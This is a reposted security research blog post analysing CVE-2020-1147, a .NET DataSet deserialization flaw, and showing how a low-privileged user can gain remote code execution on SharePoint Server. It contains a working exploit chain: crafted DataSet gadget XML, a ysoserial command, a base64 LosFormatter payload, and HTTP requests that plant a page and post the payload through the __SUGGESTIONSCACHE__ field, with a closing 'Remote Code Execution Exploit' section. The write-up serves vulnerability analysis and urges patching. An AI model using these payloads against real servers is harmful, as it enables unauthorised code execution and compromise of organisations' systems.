> 原文链接: https://www.anquanke.com//post/id/211310 


# SharePoint and Pwn :: Remote Code Execution Against SharePoint Server Abusing DataSet


                                阅读量   
                                **207244**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t015dff6f603e20e97d.png)](https://p2.ssl.qhimg.com/t015dff6f603e20e97d.png)



作者：360核心安全团队

## 0x01 Summary

When [CVE-2020-1147](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1147) was released last week I was curious as to how this vulnerability manifested and how an attacker might achieve remote code execution with it. Since I’m somewhat familar with SharePoint Server and .net, I decided to take a look.

TL;DR

I share the breakdown of CVE-2020-1147 which was discovered independently by [Oleksandr Mirosh](https://twitter.com/olekmirosh), [Markus Wulftange](https://twitter.com/mwulftange) and [Jonathan Birch](https://www.linkedin.com/in/jonathan-birch-ab27681/). I share the details on how it can be leveraged against a SharePoint Server instance to gain remote code execution as a low privileged user. Please note: I am not providing a full exploit, so if that’s your jam, move along.

One of the things that stood out to me, was that Microsoft published [Security Guidence](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance) related to this bug, quoting Microsoft:

> If the incoming XML data contains an object whose type is not in this list… An exception is thrown. The deserialization operation fails. When loading XML into an existing DataSet or DataTable instance, the existing column definitions are also taken into account. If the table already contains a column definition of a custom type, that type is temporarily added to the allow list for the duration of the XML deserialization operation.

Interestingly, it was possible to specify types and it was possible to overwrite column definitions. That was the key giveaway for me, let’s take a look at how the `DataSet` object is created:



## 0x02 Analyze

### Understanding the DataSet Object

A [`DataSet`](https://docs.microsoft.com/en-us/dotnet/api/system.data.dataset?view=netcore-3.1) contains a `Datatable` with `DataColumn`(s) and `DataRow`(s). More importantly, it implements the ISerializable interface meaning that it can be serialized with `XmlSerializer`. Let’s start by creating a `DataTable`:

```
static void Main(string[] args)
`{`
    // instantiate the table
    DataTable exptable = new DataTable("exp table");

    // make a column and set type information and append to the table
    DataColumn dc = new DataColumn("ObjectDataProviderCol");
    dc.DataType = typeof(ObjectDataProvider);
    exptable.Columns.Add(dc);

    // make a row and set an object instance and append to the table
    DataRow row = exptable.NewRow();
    row["ObjectDataProviderCol"] = new ObjectDataProvider();
    exptable.Rows.Add(row);

    // dump the xml schema
    exptable.WriteXmlSchema("c:/poc-schema.xml");
`}`
```

Using the `WriteXmlSchema` method, It’s possible to write out the schema definition. That code produces the following:

```
&lt;?xml version="1.0" standalone="yes"?&gt;
&lt;xs:schema id="NewDataSet" xmlns="" xmlns:xs="[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema)" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata"&gt;
  &lt;xs:element name="NewDataSet" msdata:IsDataSet="true" msdata:MainDataTable="exp_x0020_table" msdata:UseCurrentLocale="true"&gt;
    &lt;xs:complexType&gt;
      &lt;xs:choice minOccurs="0" maxOccurs="unbounded"&gt;
        &lt;xs:element name="exp_x0020_table"&gt;
          &lt;xs:complexType&gt;
            &lt;xs:sequence&gt;
              &lt;xs:element name="ObjectDataProviderCol" msdata:DataType="System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" type="xs:anyType" minOccurs="0" /&gt;
            &lt;/xs:sequence&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
      &lt;/xs:choice&gt;
    &lt;/xs:complexType&gt;
  &lt;/xs:element&gt;
&lt;/xs:schema&gt;
```

Looking into the code of `DataSet` it’s revealed that it exposes its own serialization methods (wrapped over `XmlSerializer`) using `WriteXml` and `ReadXML`:

```
System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
  System.Data.DataSet.ReadXmlDiffgram(XmlReader reader)
    System.Data.XmlDataLoader.LoadData(XmlReader reader)
      System.Data.XmlDataLoader.LoadTable(DataTable table, Boolean isNested)
        System.Data.XmlDataLoader.LoadColumn(DataColumn column, Object[] foundColumns)
          System.Data.DataColumn.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
            System.Data.Common.ObjectStorage.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
```

Now, all that’s left to do is add the table to a dataset and serialize it up:

```
DataSet ds = new DataSet("poc");
ds.Tables.Add(exptable);
using (var writer = new StringWriter())
`{`
    ds.WriteXml(writer);
    Console.WriteLine(writer.ToString());
`}`
```

These serialization methods retain schema types and reconstruct attacker influenced types at runtime using a single `DataSet` expected type in the instantiated `XmlSerializer` object graph.

### The DataSet Gadget

Below is an example of such a gadget that can be crafted, note that this is not to be confused with the DataSet gadgets in `ysoserial`:

```
&lt;DataSet&gt;
  &lt;xs:schema xmlns="" xmlns:xs="[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema)" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="somedataset"&gt;
    &lt;xs:element name="somedataset" msdata:IsDataSet="true" msdata:UseCurrentLocale="true"&gt;
      &lt;xs:complexType&gt;
        &lt;xs:choice minOccurs="0" maxOccurs="unbounded"&gt;
          &lt;xs:element name="Exp_x0020_Table"&gt;
            &lt;xs:complexType&gt;
              &lt;xs:sequence&gt;
                &lt;xs:element name="pwn" msdata:DataType="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" type="xs:anyType" minOccurs="0"/&gt;
              &lt;/xs:sequence&gt;
            &lt;/xs:complexType&gt;
          &lt;/xs:element&gt;
        &lt;/xs:choice&gt;
      &lt;/xs:complexType&gt;
    &lt;/xs:element&gt;
  &lt;/xs:schema&gt;
  &lt;diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1"&gt;
    &lt;somedataset&gt;
      &lt;Exp_x0020_Table diffgr:id="Exp Table1" msdata:rowOrder="0" diffgr:hasChanges="inserted"&gt;
        &lt;pwn xmlns:xsi="[http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance)" xmlns:xsd="[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema)"&gt;
          &lt;ExpandedElement/&gt;
          &lt;ProjectedProperty0&gt;
            &lt;MethodName&gt;Parse&lt;/MethodName&gt;
            &lt;MethodParameters&gt;
              &lt;anyType xmlns:xsi="[http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance)" xmlns:xsd="[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema)" xsi:type="xsd:string"&gt;&lt;![CDATA[&lt;ResourceDictionary xmlns="[http://schemas.microsoft.com/winfx/2006/xaml/presentation](http://schemas.microsoft.com/winfx/2006/xaml/presentation)" xmlns:x="[http://schemas.microsoft.com/winfx/2006/xaml](http://schemas.microsoft.com/winfx/2006/xaml)" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;&lt;ObjectDataProvider x:Key="LaunchCmd" ObjectType="`{`x:Type Diag:Process`}`" MethodName="Start"&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;System:String&gt;cmd&lt;/System:String&gt;&lt;System:String&gt;/c mspaint &lt;/System:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;&lt;/anyType&gt;
            &lt;/MethodParameters&gt;
            &lt;ObjectInstance xsi:type="XamlReader"/&gt;
          &lt;/ProjectedProperty0&gt;
        &lt;/pwn&gt;
      &lt;/Exp_x0020_Table&gt;
    &lt;/somedataset&gt;
  &lt;/diffgr:diffgram&gt;
&lt;/DataSet&gt;
```

This gadget chain will call an arbitrary static method on a `Type` which contains no interface members. Here I used the notorious `XamlReader.Parse` to load malicious Xaml to execute a system command. I used the `ExpandedWrapper` class to load two different types as mentioned by [@pwntester](https://twitter.com/pwntester)’s [amazing research](https://speakerdeck.com/pwntester/attacking-net-serialization).

It can be leveraged in a number of sinks, such as:

```
XmlSerializer ser = new XmlSerializer(typeof(DataSet));
Stream reader = new FileStream("c:/poc.xml", FileMode.Open);
ser.Deserialize(reader);
```

Many applications consider `DataSet` to be safe, so even if the expected type can’t be controlled directly to `XmlSerializer`, `DataSet` is typically used in the object graph. However, the most interesting sink is the `DataSet.ReadXml` to trigger code execution:

```
DataSet ds = new DataSet();
ds.ReadXml("c:/poc.xml");
```

### Applying the Gadget to SharePoint Server

If we take a look at [ZDI-20-874](https://www.zerodayinitiative.com/advisories/ZDI-20-874/), the advisory mentions the `Microsoft.PerformancePoint.Scorecards.Client.ExcelDataSet` control which can be leveraged for remote code execution. This immediately plagued my interest since it had the name (DataSet) in its class name. Let’s take a look at SharePoint’s default web.config file:

```
&lt;controls&gt;
&lt;add tagPrefix="asp" namespace="System.Web.UI" assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" /&gt;
&lt;add tagPrefix="SharePoint" namespace="Microsoft.SharePoint.WebControls" assembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" /&gt;
&lt;add tagPrefix="WebPartPages" namespace="Microsoft.SharePoint.WebPartPages" assembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" /&gt;
&lt;add tagPrefix="PWA" namespace="Microsoft.Office.Project.PWA.CommonControls" assembly="Microsoft.Office.Project.Server.PWA, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" /&gt;
&lt;add tagPrefix="spsswc" namespace="Microsoft.Office.Server.Search.WebControls" assembly="Microsoft.Office.Server.Search, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" /&gt;
&lt;/controls&gt;
```

Under the controls tag, we can see that a prefix doesn’t exist for the `Microsoft.PerformancePoint.Scorecards` namespace. However, if we check the SafeControl tags, it is indeed listed with all types from that namespace permitted.

```
&lt;configuration&gt;
  &lt;configSections&gt;
  &lt;SharePoint&gt;
    &lt;SafeControls&gt;
      &lt;SafeControl Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" Namespace="Microsoft.PerformancePoint.Scorecards" TypeName="*" /&gt;
...
```

Now that we know we can instantiate classes from that namespace, let’s dive into the code to inspect the `ExcelDataSet` type:

```
namespace Microsoft.PerformancePoint.Scorecards
`{`

 [Serializable]
 public class ExcelDataSet
`{`
```

The first thing I noticed is that it’s serializable, so I know that it can infact be instantiated as a control and the default constructor will be called along with any public setters that are not marked with the `System.Xml.Serialization.XmlIgnoreAttribute` attribute. SharePoint uses `XmlSerializer` for creating objects from controls so anywhere in the code where attacker supplied data can flow into `TemplateControl.ParseControl`, the `ExcelDataSet` type can be leveraged.

One of the properties that stood out was the `DataTable` property since it contains a public setter and uses the type `System.Data.DataTable`. However, on closer inspection, we can see that the `XmlIgnore` attribute is being used, so we can’t trigger the deserialization using this setter.

```
[XmlIgnore]
public DataTable DataTable
`{`
 get
 `{`
  if (this.dataTable == null &amp;&amp; this.compressedDataTable != null)
  `{`
   this.dataTable = (Helper.GetObjectFromCompressedBase64String(this.compressedDataTable, ExcelDataSet.ExpectedSerializationTypes) as DataTable);
   if (this.dataTable == null)
   `{`
    this.compressedDataTable = null;
   `}`
  `}`
  return this.dataTable;
 `}`
 set
 `{`
  this.dataTable = value;
  this.compressedDataTable = null;
 `}`
`}`
```

The above code does reveal the partial answer though, the getter calls `GetObjectFromCompressedBase64String` using the `compressedDataTable` property. This method will decode the supplied base64, decompress the binary formatter payload and call BinaryFormatter.Deserialize with it. However, the code contains expected types for the deserialization, one of which is `DataTable`, So we can’t just stuff a generated [TypeConfuseDelegate](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs) here.

```
private static readonly Type[] ExpectedSerializationTypes = new Type[]
`{`
    typeof(DataTable),
    typeof(Version)
`}`;
```

Inspecting the `CompressedDataTable` property, we can see that we have no issues setting the `compressedDataTable` member since it’s using `System.Xml.Serialization.XmlElementAttribute` attribute.

```
[XmlElement]
public string CompressedDataTable
`{`
 get
 `{`
  if (this.compressedDataTable == null &amp;&amp; this.dataTable != null)
  `{`
   this.compressedDataTable = Helper.GetCompressedBase64StringFromObject(this.dataTable);
  `}`
  return this.compressedDataTable;
 `}`
 set
 `{`
  this.compressedDataTable = value;
  this.dataTable = null;
 `}`
`}`
```

Putting it (almost all) together, I could register a prefix and instantiate the control with a base64 encoded, compressed and serialized, albeit, dangerous `DataTable`:

```
PUT /poc.aspx HTTP/1.1
Host: &lt;target&gt;
Authorization: &lt;ntlm auth header&gt;
Content-Length: 1688

&lt;%@ Register TagPrefix="escape" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"%&gt;
&lt;escape:ExcelDataSet runat="server" CompressedDataTable="H4sIAAAAAAAEALVWW2/bNhROegmadtvbHvYm6KFPtmTHSdoqlgs06YZgcRPE2RqgKDKaOrbZSKRGUraMYv9o+43doUTZju2mabHJgESfOw+/80kbmxsbG5/wMk9zfXcPb296U6Uh8Y6IJjXnd5CKCR7ueg3zqzmHWawzCSGHTEsS15yzrB8z+itML8Q18LD/7BnZo3v7zRetXWg8f/HQBP9xIWZxuyD9GO6j5qfZP+8cEqEZH9qU25dJ3KMjSMgTXB2xweAXSZL7m5s/2GDWztS8bUJtPcDb34/aL/Mkdsa2brfpNVwHOBURhg7dTA/qzX33Zef7x+1cBapI4KAHV6Hrlosgx/VI6zTw/clk4k1anpBDf6fRaPqX3ZOyqMo2URHuAANLbqOpesKoFEoMdJ2KJEC7emnlYlbHMXkhhgS4djhJIHRf5+lV3mjsNK6KTpRmpSEGSGPIL6YpWGkpV/BnhruaC9fFTSfcdcrUQdFnjBK6i2fRAzlmFJR3zDVITmIPayE8guitJGkK8o+dd++sw1vGIzFRXpfI6yz1LkkSnwOJQCIGJChMSzS2/Gc8JZgIef0N4Gk1+4PW8719ErX2d6G19762nLyo+rT/Aag2yzMpxuz/LeF9zVnXsf9gNFxHFweC50b41BzO7LQ0kUPQb3AbKiUUDDQTxk8pzSRiExHtz9Hgr8KhkC1DpxBagHwGiEokYPIr0LNSjpXZdw906GqZzUvsEsZnw7uK4crsNwWHmZSY40RQYiyLKHeAOB0JbPTSvhOSV/8y3heZgeq8G3fZd9mvYlI7Ww+RMv553I6QXYYyKB8k+ZbRtj5liC/5VInq46blhIXOV3tZ6qhji2RR0WynEDZnfZZicipxEoouWdMRUYcjwoeA3WJcgdTYrHmPkR5mhMe+zHh1DKEJgmxOk9EdeHKRoSpyeW1R5y8qcZbNWEOEC2QePW0saFFfTv2xLcLBmoNyfuZM5N6IiD5d0CMRmTnqnBGpoO0vSNZYohFqkArVDS3q7YQupMXtB0pLfK24naexPjgHJTJJ4YhRQ0JETqv3iu2RxYM3w4OHePAnjA9y07R9P8eN+OkCkc06/XUxKreSt0KXxrLOKy6x0gOiFCT9eBomigoZs37ldcTIcL2PZ1RcKM2omvurQuc+HeoD04ZVcnbyADkwdE9IxunoMMGBLY3K99HHPCg6a4IH6IPkqv5ynflB4SsL+VDfksFbPr3KtKw76BXHZIQ0iYzcX1Gstfapg5xFnc+7+F9RzBrbmWoVPEbV9i3sbmLVvwWsbf+WOWr7OPMzrlwiGEuWN5mo7S9xY+eB+dZa+gYzX15bV13yQUh8MG4erzIWR9tX5zBmxsR8Xz7C65791vxkryf/AlZRMe+GCgAA" /&gt;
```

However, I couldn’t figure out a way to trigger the `DataTable` property getter. I know I needed a way to use the `DataSet`, but I just didn’t know how too.

### Many Paths Lead to Rome

The fustration! After going for a walk with my dog, I decided to think about this differently and I asked myself what other sinks are available. Then I remembered that the `DataSet.ReadXml` sink was also a source of trouble, so I checked the code again and found this valid code path:

```
Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetDataSet()
Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.PopulateDataSetFromCache(DataSet)
```

Inside of the `ContactLinksSuggestionsMicroView` class we can see the `GetDataSet` method:

```
protected override DataSet GetDataSet()
`{`
    base.StopProcessingRequestIfNotNeeded();
    if (!this.Page.IsPostBack || this.Hidden)                                                                       // 1
    `{`
        return null;
    `}`
    DataSet dataSet = new DataSet();
    DataTable dataTable = dataSet.Tables.Add();
    dataTable.Columns.Add("PreferredName", typeof(string));
    dataTable.Columns.Add("Weight", typeof(double));
    dataTable.Columns.Add("UserID", typeof(string));
    dataTable.Columns.Add("Email", typeof(string));
    dataTable.Columns.Add("PageURL", typeof(string));
    dataTable.Columns.Add("PictureURL", typeof(string));
    dataTable.Columns.Add("Title", typeof(string));
    dataTable.Columns.Add("Department", typeof(string));
    dataTable.Columns.Add("SourceMask", typeof(int));
    if (this.IsInitialPostBack)                                                                                      // 2
    `{`
        this.PopulateDataSetFromSuggestions(dataSet);
    `}`
    else
    `{`
        this.PopulateDataSetFromCache(dataSet);                                                                  // 3
    `}`
    this.m_strJavascript.AppendLine("var user = new Object();");
    foreach (object obj in dataSet.Tables[0].Rows)
    `{`
        DataRow dataRow = (DataRow)obj;
        string scriptLiteralToEncode = (string)dataRow["UserID"];
        int num = (int)dataRow["SourceMask"];
        this.m_strJavascript.Append("user['");
        this.m_strJavascript.Append(SPHttpUtility.EcmaScriptStringLiteralEncode(scriptLiteralToEncode));
        this.m_strJavascript.Append("'] = ");
        this.m_strJavascript.Append(num.ToString(CultureInfo.CurrentCulture));
        this.m_strJavascript.AppendLine(";");
    `}`
    StringWriter stringWriter = new StringWriter(CultureInfo.CurrentCulture);
    dataSet.WriteXml(stringWriter);
    SPPageContentManager.RegisterHiddenField(this.Page, "__SUGGESTIONSCACHE__", stringWriter.ToString());
    return dataSet;
`}`
```

At [1] the code checks that the request is a POST back request. To ensure this, an attacker can set the `__viewstate` POST variable, then at [2] the code will check that the `__SUGGESTIONSCACHE__` POST variable is set, if it’s set, the `IsInitialPostBack` getter will return false. As long as this getter returns false, an attacker can land at [3], reaching `PopulateDataSetFromCache`. This call will use a `DataSet` that has been created with a specific schema definition.

```
protected void PopulateDataSetFromCache(DataSet ds)
`{`
    string value = SPRequestParameterUtility.GetValue&lt;string&gt;(this.Page.Request, "__SUGGESTIONSCACHE__", SPRequestParameterSource.Form);
    using (XmlTextReader xmlTextReader = new XmlTextReader(new StringReader(value)))
    `{`
        xmlTextReader.DtdProcessing = DtdProcessing.Prohibit;
        ds.ReadXml(xmlTextReader);                                                                              // 4
        ds.AcceptChanges();
    `}`
`}`
```

Inside of `PopulateDataSetFromCache`, the code calls`SPRequestParameterUtility.GetValue` to get attacker controlled data from the `__SUGGESTIONSCACHE__` request variable and parses it directly into `ReadXml` using `XmlTextReader`. The previously defined schema is overwritten with the attacker supplied schema inside of the supplied XML and deserialization of untrusted types occurs at [4], leading to remote code execution. To trigger this, I created a page that uses the `ContactLinksSuggestionsMicroView` type specifically:

```
PUT /poc.aspx HTTP/1.1
Host: &lt;target&gt;
Authorization: &lt;ntlm auth header&gt;
Content-Length: 252

&lt;%@ Register TagPrefix="escape" Namespace="Microsoft.SharePoint.Portal.WebControls" Assembly="Microsoft.SharePoint.Portal, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"%&gt;
&lt;escape:ContactLinksSuggestionsMicroView runat="server" /&gt;
```

If you are exploiting this bug as a low privlidged user and the `AddAndCustomizePages` setting is disabled, then you can possibly exploit the bug with pages that instantiate the `InputFormContactLinksSuggestionsMicroView` control, since it extends from `ContactLinksSuggestionsMicroView`.

```
namespace Microsoft.SharePoint.Portal.WebControls
`{`

 [SharePointPermission(SecurityAction.Demand, ObjectModel = true)]
 [AspNetHostingPermission(SecurityAction.LinkDemand, Level = AspNetHostingPermissionLevel.Minimal)]
 [AspNetHostingPermission(SecurityAction.InheritanceDemand, Level = AspNetHostingPermissionLevel.Minimal)]
 [SharePointPermission(SecurityAction.InheritanceDemand, ObjectModel = true)]
 public class InputFormContactLinksSuggestionsMicroView : ContactLinksSuggestionsMicroView
`{`
```

The endpoints I found (but remain untested) are:
1. `https://&lt;target&gt;/_layouts/15/quicklinks.aspx`
1. `https://&lt;target&gt;/_layouts/15/quicklinksdialogform.aspx`
Now, to exploit it we can perform a post request to our freshly crafted page:

```
POST /poc.aspx HTTP/1.1
Host: &lt;target&gt;
Authorization: &lt;ntlm auth header&gt;
Content-Type: application/x-www-form-urlencoded
Content-Length: &lt;length&gt;

__viewstate=&amp;__SUGGESTIONSCACHE__=&lt;urlencoded DataSet gadget&gt;
```

### One Last Thing

You cannot use the `XamlReader.Load` static method because the IIS webserver is impersonating as the IUSR account and that account has limited access to the registry. If you try, you will end up with a stack trace like this unless you disable impersonation under IIS and use the application pool identity:

```
`{`System.InvalidOperationException: There is an error in the XML document. ---&gt; System.TypeInitializationException: The type initializer for 'MS.Utility.EventTrace' threw an exception. ---&gt; System.Security.SecurityException: Requested registry access is not allowed.
   at System.ThrowHelper.ThrowSecurityException(ExceptionResource resource)
   at Microsoft.Win32.RegistryKey.OpenSubKey(String name, Boolean writable)
   at Microsoft.Win32.RegistryKey.OpenSubKey(String name)
   at Microsoft.Win32.Registry.GetValue(String keyName, String valueName, Object defaultValue)
   at MS.Utility.EventTrace.IsClassicETWRegistryEnabled()
   at MS.Utility.EventTrace..cctor()
   --- End of inner exception stack trace ---
   at MS.Utility.EventTrace.EasyTraceEvent(Keyword keywords, Event eventID, Object param1)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode, Boolean useRestrictiveXamlReader, List`1 safeTypes)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode, Boolean useRestrictiveXamlReader)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader)
   at System.Windows.Markup.XamlReader.Parse(String xamlText)
   --- End of inner exception stack trace ---
   at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader, String encodingStyle, XmlDeserializationEvents events)
   at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader, String encodingStyle)
   at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
   at System.Data.Common.ObjectStorage.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
   at System.Data.DataColumn.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
   at System.Data.XmlDataLoader.LoadColumn(DataColumn column, Object[] foundColumns)
   at System.Data.XmlDataLoader.LoadTable(DataTable table, Boolean isNested)
   at System.Data.XmlDataLoader.LoadData(XmlReader reader)
   at System.Data.DataSet.ReadXmlDiffgram(XmlReader reader)
   at System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
   at System.Data.DataSet.ReadXml(XmlReader reader)
   at Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.PopulateDataSetFromCache(DataSet ds)
   at Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetDataSet()
at Microsoft.SharePoint.Portal.WebControls.PrivacyItemView.GetQueryResults(Object obj)
```

You need to find another dangerous static method or setter to call from a type that doesn’t use interface members, <del style="box-sizing: border-box;">I leave this as an exercise to the reader, good luck!</del>

### Remote Code Execution Exploit

Ok so I lied. Look the truth is, I just want people to read the full blog post and not rush to find the exploit payload, it’s better to understand the underlying technology you know? Anyway, to exploit this bug we can (ab)use the `LosFormatter.Deserialize` method since the class contains no interface members. To do so, we need to generate a base64 payload of a serialized `ObjectStateFormatter` gadget chain:

`c:\&gt; ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c mspaint`

Now, we can plug the payload into the following DataSet gadget and trigger remote code execution against the target SharePoint Server!

```
&lt;DataSet&gt;
  &lt;xs:schema xmlns="" xmlns:xs="[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema)" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="somedataset"&gt;
    &lt;xs:element name="somedataset" msdata:IsDataSet="true" msdata:UseCurrentLocale="true"&gt;
      &lt;xs:complexType&gt;
        &lt;xs:choice minOccurs="0" maxOccurs="unbounded"&gt;
          &lt;xs:element name="Exp_x0020_Table"&gt;
            &lt;xs:complexType&gt;
              &lt;xs:sequence&gt;
                &lt;xs:element name="pwn" msdata:DataType="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" type="xs:anyType" minOccurs="0"/&gt;
              &lt;/xs:sequence&gt;
            &lt;/xs:complexType&gt;
          &lt;/xs:element&gt;
        &lt;/xs:choice&gt;
      &lt;/xs:complexType&gt;
    &lt;/xs:element&gt;
  &lt;/xs:schema&gt;
  &lt;diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1"&gt;
    &lt;somedataset&gt;
      &lt;Exp_x0020_Table diffgr:id="Exp Table1" msdata:rowOrder="0" diffgr:hasChanges="inserted"&gt;
        &lt;pwn xmlns:xsi="[http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance)" xmlns:xsd="[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema)"&gt;
        &lt;ExpandedElement/&gt;
        &lt;ProjectedProperty0&gt;
            &lt;MethodName&gt;Deserialize&lt;/MethodName&gt;
            &lt;MethodParameters&gt;
                &lt;anyType xmlns:xsi="[http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance)" xmlns:xsd="[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema)" xsi:type="xsd:string"&gt;/wEykwcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC1BTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBtc3BhaW50IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=&lt;/anyType&gt;
            &lt;/MethodParameters&gt;
            &lt;ObjectInstance xsi:type="LosFormatter"&gt;&lt;/ObjectInstance&gt;
        &lt;/ProjectedProperty0&gt;
        &lt;/pwn&gt;
      &lt;/Exp_x0020_Table&gt;
    &lt;/somedataset&gt;
  &lt;/diffgr:diffgram&gt;
&lt;/DataSet&gt;
```

[![](https://p403.ssl.qhimgs4.com/t012cee72c7de60e6fc.png)](https://p403.ssl.qhimgs4.com/t012cee72c7de60e6fc.png)



## 0x03 Conclusion

Microsoft rate this bug with an exploitability index rating of 1 and we agree, meaning you should patch this immediately if you haven’t. It is highly likley that this gadget chain can be used against several applications built with .net so even if you don’t have a SharePoint Server installed, you are still impacted by this bug.



## 0x04 References

